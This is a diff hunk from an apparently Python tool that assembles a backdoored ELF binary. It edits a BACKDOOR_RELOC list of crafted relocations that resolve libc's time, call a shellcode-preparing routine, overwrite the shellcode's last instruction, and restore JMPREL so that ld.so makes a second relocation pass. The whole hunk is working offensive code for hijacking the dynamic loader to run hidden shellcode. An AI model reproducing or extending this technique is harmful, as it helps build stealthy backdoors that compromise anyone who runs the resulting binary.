@@ -379,8 +379,10 @@ BACKDOOR_RELOC += [
     # Resolve time
     WriteIMM64Obf(symbol_name_buffer, u64(b"time\x00\x00\x00\x00")),
     Relocation(time_ptr_buf.address, RTYPE.R64, symidx=stage2.symidx[SYMBOL_2]),
-    # Call prepare_sc; write the return value (0) to clear time_ptr_buf.
-    Relocation(time_ptr_buf.address, RTYPE.R64, symidx=stage2.symidx[SYMBOL_1]),
+    # Call prepare_sc; write the return value (0) to the end of shellcode to clear last instrn.
+    Relocation(prepare_sc_buf.address + prepare_sc_buf.size - 8, RTYPE.R64, symidx=stage2.symidx[SYMBOL_1]),
+    # Clear time_ptr_buf
+    Relocation(time_ptr_buf.address, RTYPE.SIZE64, addend=0),
     # Restore original JMPREL. We have carefully set up the DT_RELA/DT_JMPREL/DT_RELASZ so that ld.so would do
     # a second pass on JMPREL.
     Relocation(stage2.symtab(SYMBOL_0) + 8, RTYPE.RELATIVE, addend=backup_jmprel_buf.address),
